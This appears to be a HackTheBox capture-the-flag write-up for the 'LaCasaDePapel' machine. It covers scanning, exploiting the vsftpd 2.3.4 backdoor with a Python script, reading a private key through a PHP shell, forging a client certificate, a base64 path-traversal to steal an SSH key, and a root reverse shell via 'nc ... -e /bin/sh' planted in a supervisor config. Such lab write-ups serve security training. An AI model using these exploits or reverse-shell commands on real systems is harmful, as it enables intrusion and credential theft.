---
title: HTB | LaCasaDePapel
author: Zeropio
date: 2022-12-31
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/lacasadepapel
image:
  path: /assets/img/hackthebox/card/LaCasaDePapel.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)
|   256 41e495a3390b25f9dadebe6adc59486d (ECDSA)
|_  256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
|_http-title: La Casa De Papel
Service Info: OS: Unix
```

## Enumeration

### FTP

Anonymous login doesn’t work. But there is a vulnerability associated to this version:

```
vsftpd 2.3.4 - Backdoor Command Execution                                                                                  | unix/remote/49757.py
```

### Web

We found a web with a QR, Google Authenticator and an email:

![Untitled](/assets/img/hackthebox/labs/lacasadepapel/Untitled.png)

Fuzzing will show:

```
                        [Status: 200, Size: 1754, Words: 197, Lines: 57, Duration: 293ms]
qrcode                  [Status: 500, Size: 1039, Words: 50, Lines: 11, Duration: 302ms]
favicon.ico             [Status: 200, Size: 1406, Words: 2, Lines: 2, Duration: 51ms]
```

In the page `http://10.10.10.131/qrcode` there is a error message that show the user ********oslo********:

```
Error: Bad data
    at encode (/home/oslo/node_modules/qr-image/lib/encode.js:147:15)
    at QR (/home/oslo/node_modules/qr-image/lib/qr-base.js:170:19)
    at Object.qr_image [as image] (/home/oslo/node_modules/qr-image/lib/qr.js:48:18)
    at /home/oslo/server.js:60:19
    at Layer.handle [as handle_request] (/home/oslo/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/oslo/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/oslo/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/oslo/node_modules/express/lib/router/layer.js:95:5)
    at /home/oslo/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/oslo/node_modules/express/lib/router/index.js:335:12)
```

Scanning the QR doesn’t display anything.

Inside the HTTPS page we see a certification issue:

![Untitled](/assets/img/hackthebox/labs/lacasadepapel/Untitled%201.png)

---

# Footprint

## Initial Access

The FTP vulnerability doesn’t seem to work:

```console
$ python3 49757.py 10.10.10.131
Success, shell opened
Send `exit` to quit shell
Traceback (most recent call last):
  File "/home/zeropio/Pentesting/Exploits/49757.py", line 32, in <module>
    tn2.interact()
  File "/usr/lib/python3.10/telnetlib.py", line 555, in interact
    sys.stdout.write(text.decode('ascii'))
UnicodeDecodeError: 'ascii' codec can't decode byte 0xe2 in position 34: ordinal not in range(128)
```

But with this code:

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import os
import time

def exploit(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send('USER :)\n')
    sock.send('PASS HTBPass\n')
    time.sleep(2)
    sock.close()
    os.system('rlwrap nc 10.10.10.131 6200 -v')

exploit('10.10.10.131', 21)
```

We can get it work:

```console
$ python2 49757.py 
10.10.10.131: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.131] 6200 (?) open
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```

We got an PHP debugger shell.

Also, we can exploit this vulnerability manually. First we can see that the port 6200 is closed:

```console
$ nc 10.10.10.131 6200
(UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused
```

We need to send a FTP login with the string `:)` in the user field:

```console
$ nc 10.10.10.131 21         
220 (vsFTPd 2.3.4)
USER zero:)
PASS zero
331 Please specify the password.
```

And now start a connection. We can use `rlwrap` to make it interactive:

```console
$ rlwrap nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```

Some functions are being blocked:

```php
shell_exec()
PHP Fatal error:  Call to undefined function shell_exec() in Psy Shell code on line 1
```

Even though there are not direct execution, we can use other functions:

```php
scandir("/")
=> [
     ".",
     "..",
     ".DS_Store",
     "._.DS_Store",
     "bin",
     "boot",
     "dev",
     "etc",
     "home",
     "lib",
     "lost+found",
     "media",
     "mnt",
     "opt",
     "proc",
     "root",
     "run",
     "sbin",
     "srv",
     "swap",
     "sys",
     "tmp",
     "usr",
     "var",
   ]
```

The list of users can be get:

```php
scandir("/home")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```

Searching we can find a certificate:

```php
file_get_contents("/home/nairobi/ca.key")
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
. . . <SNIP> . . .
```

Now we must create a certificate. First export the certificate from the HTTPS web:

```console
$ openssl req -new -key client.key -out client.csr
$ openssl x509 -req -in client.csr -CA lacasadepapel_htb.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer
$ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```

Import `client.pk12` to **Your Certificates** page and `lacasadepapel_htb.crt` to **Authorities**. Now reload the web:

![Untitled](/assets/img/hackthebox/labs/lacasadepapel/Untitled%202.png)

In the first session there is a bunch of files in the following format: `https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp` . It it encode as base64:

```console
$ echo "U0VBU09OLTEvMDEuYXZp" | base64 -d
SEASON-1/01.avi
```

We can try a LFI encoding the path.

```console
$ echo -n '../.ssh/id_rsa' | base64
Li4vLnNzaC9pZF9yc2E=
```

Accessing the URL `https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E=` will download **id_rsa**. Testing each user, **professor** will grant us the shell:

```console
$ ssh professor@10.10.10.131 -i id_rsa

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$
```

## Privilege Escalation

A weird file can be found there:

```console
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

As this folder is in the home user, we can move it and create other:

```console
lacasadepapel [~]$ mv memcached.ini memcached.ini.save
lacasadepapel [~]$ printf '[program:memcached]\ncommand = sudo -u root /usr/bin/nc 10.10.14.7 60002 -e /bin/sh\n' > /home/professor/memcached.ini
```

Now wait for the reverse shell to start as root.
